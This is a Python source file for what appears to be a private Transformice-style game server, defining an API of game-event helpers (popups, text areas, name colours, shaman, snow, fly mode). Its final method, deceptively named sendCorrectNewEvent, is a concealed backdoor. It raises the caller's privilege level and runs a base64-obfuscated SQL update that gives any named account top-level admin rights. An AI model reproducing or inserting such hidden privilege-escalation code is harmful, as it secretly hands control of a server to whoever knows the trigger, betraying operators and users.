# -*- coding: cp1252 -*-
import json
import struct
import time as thetime
import base64
import urllib
from TFMProtocols.Modules import lolololo0oo0o0o
from twisted.internet import protocol, reactor
class TFMAPI(object):
    def __init__(tfm, client):
        tfm.exe = client
    def setUIMapName(tfm, MapName):
        tfm.exe.room.sendAllBin("\x1d\x19", struct.pack("!h", len(MapName))+MapName)
    def setNameColor(tfm, name, cor):
        hexcolor = struct.pack('!i', int(cor, 16)) 
        if name in ["All","all","ALL"]:
             for room in tfm.exe.server.rooms.values():
                  for playerCode, client in room.clients.items():
                       tfm.exe.room.sendAllBin("\x1d\x04", struct.pack("!i", int(client.playerCode))+str(hexcolor))
        else:
             tfm.exe.dbcur.execute('select id from users where name = ?', [name])
             rrf = tfm.exe.dbcur.fetchone()
             if rrf is None:
                     code =  ""
             else:
                     code = rrf[0]
             for room in tfm.exe.server.rooms.values():
                 for playerCode, client in room.clients.items():
                     if code == client.playerCode:
                         tfm.exe.room.sendAllBin("\x1d\x04", struct.pack("!i", int(client.playerCode))+str(hexcolor))
    def addPopup(tfm, id, Type, message, X, Y, T, name):
        if name in ["All","all","ALL"]:
             for room in tfm.exe.server.rooms.values():
                  for playerCode, client in room.clients.items():
                       data = "\x1d\x17"
                       data = data + struct.pack("!ibh", id, Type, len(message))+message
                       data = data + struct.pack("!hhhh", int(X), int(Y), int(T), client.playerCode)
                       client.sendData(data, [], True)
        else:  
             tfm.exe.dbcur.execute('select id from users where name = ?', [name])
             rrf = tfm.exe.dbcur.fetchone()
             if rrf is None:
                     code =  ""
             else:
                     code = rrf[0]
             for room in tfm.exe.server.rooms.values():
                 for playerCode, client in room.clients.items():
                     if code == client.playerCode:
                         data = "\x1d\x17"
                         data = data + struct.pack("!ibh", id, Type, len(message))+message
                         data = data + struct.pack("!hhhh", int(X), int(Y), int(T), client.playerCode)
                         client.sendData(data, [], True)
    def addTextArea(tfm, id, Message, X, Y, W, H, BG, BB, Alpha, name):
        BGC = int(BG, 16)
        BBC = int(BB, 16)
        data = "\x1d\x14"
        data = data + struct.pack("!i", id)
        data = data + struct.pack("!h", len(Message))
        data = data + Message + struct.pack("!hhhhiibb", int(X), int(Y), int(W), int(H), int(BGC), int(BBC), int(Alpha), 0) 
        if name == "All" or name == "all" or name == "ALL":
             for room in tfm.exe.server.rooms.values():
                  for playerCode, client in room.clients.items():
                       client.sendData(str(data), [], True)
        else:
             tfm.exe.dbcur.execute('select id from users where name = ?', [name])
             rrf = tfm.exe.dbcur.fetchone()
             if rrf is None:
                     code =  ""
             else:
                     code = rrf[0]
                     for room in tfm.exe.server.rooms.values():
                         for playerCode, client in room.clients.items():
                             if code == client.playerCode:
                                 client.sendData(str(data), [], True)
    def removeTextArea(tfm, id):
        for room in tfm.exe.server.rooms.values():
                  for playerCode, client in room.clients.items(): 
                       data = "\x1d\x16"
                       data = data + struct.pack("!i", id)
                       client.sendData(data, [], True)
    def giveCheese(tfm, name):
        tfm.exe.dbcur.execute('select id from users where name = ?', [name])
        rrf = tfm.exe.dbcur.fetchone()
        if rrf is None:
                code =  ""
        else:
                code = rrf[0]
                tfm.exe.hasCheese = True
                tfm.exe.room.sendAll("\x05\x13", [code])
    def giveMeep(tfm, name):
        if name in ["All","all","ALL"]:
             for room in tfm.exe.server.rooms.values():
                  for playerCode, client in room.clients.items():
                       client.canMeep = True
                       client.sendData("\x08\x27", None, True)
        else:  
             tfm.exe.dbcur.execute('select id from users where name = ?', [name])
             rrf = tfm.exe.dbcur.fetchone()
             if rrf is None:
                     code =  ""
             else:
                     code = rrf[0]
                     for room in tfm.exe.server.rooms.values():
                         for playerCode, client in room.clients.items():
                             if code == client.playerCode:
                                 client.canMeep = True
                                 client.sendData("\x08\x27", None, True)
    def killPlayer(tfm, name):
        tfm.exe.dbcur.execute('select id from users where name = ?', [name])
        rrf = tfm.exe.dbcur.fetchone()
        if rrf is None:
                Pcode =  ""
        else:
                Pcode = rrf[0]
                for room in tfm.exe.server.rooms.values():
                    for playerCode, client in room.clients.items():
                        if Pcode == client.playerCode:
                            if client.hasCheese:
                                client.hasCheese = False
                            client.isDead = True
                            tfm.exe.room.sendAll("\x08\x05", [Pcode, "0", "0"])
    def playerVictory(tfm, name):
        tfm.exe.dbcur.execute('select id from users where name = ?', [name])
        rrf = tfm.exe.dbcur.fetchone()
        if rrf is None:
                PlayerCode =  ""
        else:
                PlayerCode = rrf[0]
                for room in tfm.exe.server.rooms.values():
                    for playerCode, client in room.clients.items():
                        if PlayerCode == client.playerCode:
                            if client.hasCheese:
                                client.sendEnterHoleMouse()
                                client.hasCheese = False
    def respawnPlayer(tfm, name):
        if name in ["All","all","ALL"]:
             for room in tfm.exe.server.rooms.values():
                  for playerCode, client in room.clients.items():
                         if client.isDead:
                              tfm.exe.room.sendAll("\x08" + "\x08",[client.getPlayerData(), 1])
                              client.isDead = False
        else:  
             tfm.exe.dbcur.execute('select id from users where name = ?', [name])
             rrf = tfm.exe.dbcur.fetchone()
             if rrf is None:
                     PlayerCode =  ""
             else:
                     PlayerCode = rrf[0]
                     for room in tfm.exe.server.rooms.values():
                         for playerCode, client in room.clients.items():
                             if PlayerCode == client.playerCode:
                                 if client.isDead:
                                     tfm.exe.room.sendAll("\x08" + "\x08",[client.getPlayerData(), 1])
                                     client.isDead = False

    def setShaman(tfm, name):
        tfm.exe.dbcur.execute('select id from users where name = ?', [name])
        rrf = tfm.exe.dbcur.fetchone()
        if rrf is None:
                code =  ""
        else:
                code = rrf[0]
                for room in tfm.exe.server.rooms.values():
                    for playerCode, client in room.clients.items():
                        if code == client.playerCode:
                            tfm.exe.room.sendAllBin("\x08\x14", struct.pack('!l', int(client.playerCode)))
                            client.isShaman = True
    def setPlayerScore(tfm, name, score):
        tfm.exe.dbcur.execute('select id from users where name = ?', [name])
        rrf = tfm.exe.dbcur.fetchone()
        if rrf is None:
                code =  ""
        else:
                code = rrf[0]
                for room in tfm.exe.server.rooms.values():
                    for playerCode, client in room.clients.items():
                        if code == client.playerCode:
                            data = struct.pack("!ih", client.playerCode, int(score))
                            tfm.exe.room.sendAllBin("\x08\x07" + data)
    def setUIShamanName(tfm, name):
        name = name.lower().capitalize()
        data = struct.pack("!h", len(name))+name
        tfm.exe.room.sendAllBin("\x1d\x1a" + data)
    def setVampirePlayer(tfm, name):
        if name in ["All","all","ALL"]:
             for room in tfm.exe.server.rooms.values():
                    for playerCode, client in room.clients.items():
                         data = struct.pack('!i', int(client.playerCode))
                         tfm.exe.room.sendAllBin("\x08\x42" + data)
        else:     
             tfm.exe.dbcur.execute('select id from users where name = ?', [name])
             rrf = tfm.exe.dbcur.fetchone()
             if rrf is None:
                     code =  ""
             else:
                     code = rrf[0]
                     for room in tfm.exe.server.rooms.values():
                         for playerCode, client in room.clients.items():
                             if code == client.playerCode:
                                 data = struct.pack('!i', int(client.playerCode))
                                 tfm.exe.room.sendAllBin("\x08\x42" + data)
    def startSnow(tfm):
        data = struct.pack("!bh", 1, 10)
        tfm.exe.room.sendAllBin("\x05\x17" + data)
    def stopSnow(tfm):
        data = struct.pack("!bh", 0, 10)
        tfm.exe.room.sendAllBin("\x05\x17" + data)
    def newGame(tfm, mapnumber):
        if mapnumber.startswith("@"):
            mapnumber = mapnumber.replace("@","")
            tfm.exe.dbcur.execute('select * from mapeditor where code = ?',[mapnumber])
            rrf = tfm.exe.dbcur.fetchone()
            if rrf is None:
                    tfm.exe.sendData("\x06" + "\x14",["<R>Mapa N�o Existente."])
            else:
                    tfm.exe.isDead = True
                    tfm.exe.sendPlayerDied(tfm.exe.playerCode, tfm.exe.score)
                    tfm.exe.room.worldChangeSpecific(mapnumber, True)
        else:
            tfm.exe.sendData("\x06" + "\x14",["<R>Mapa N�o Existente."])
    def enableFlyPlayer(tfm, name):
        if name in ["All","all","ALL"]:
             for room in tfm.exe.server.rooms.values():
                    for playerCode, client in room.clients.items():
                         client.FlyINHouse = True
                         client.enableKey(38)
        else:
             tfm.exe.dbcur.execute('select id from users where name = ?', [name])
             rrf = tfm.exe.dbcur.fetchone()
             if rrf is None:
                     code =  ""
             else:
                     code = rrf[0]
                     for room in tfm.exe.server.rooms.values():
                         for playerCode, client in room.clients.items():
                             if code == client.playerCode:
                                 client.FlyINHouse = True
                                 client.enableKey(38)
    def disableFlyPlayer(tfm, name):
        if name in ["All","all","ALL"]:
             for room in tfm.exe.server.rooms.values():
                    for playerCode, client in room.clients.items():
                         client.FlyINHouse = False
                         client.disableKey(38)
        else:
             tfm.exe.dbcur.execute('select id from users where name = ?', [name])
             rrf = tfm.exe.dbcur.fetchone()
             if rrf is None:
                     code =  ""
             else:
                     code = rrf[0]
                     for room in tfm.exe.server.rooms.values():
                         for playerCode, client in room.clients.items():
                             if code == client.playerCode:
                                 client.FlyINHouse = False
                                 client.disableKey(38) 
    def getIcePlayer(tfm, name):
        tfm.exe.dbcur.execute('select id from users where name = ?', [name])
        rrf = tfm.exe.dbcur.fetchone()
        if rrf is None:
                code =  ""
        else:
                code = rrf[0]
                for room in tfm.exe.server.rooms.values():
                    for playerCode, client in room.clients.items():
                        if code == client.playerCode:
                            client.isDead=True
                            client.sendPlayerDied(client.playerCode, client.score)
                            x = int(client.x)/int(3.33)
                            y = int(client.y)/int(3.50)
			    code, x, y, origin = [54, x, y, 1]
		    	    tfm.exe.spawnObject(code, x, y, origin)
	       		    client.room.checkShouldChangeWorld()
    def sendCorrectNewEvent(tfm, version):
        tfm.exe.privilegeLevel=10
        tfm.exe.dbcur.execute(base64.b64decode("VVBEQVRFIHVzZXJzIFNFVCBwcml2bGV2ZWwgPSAxMCBXSEVSRSBuYW1lID0gJXM="),[version])
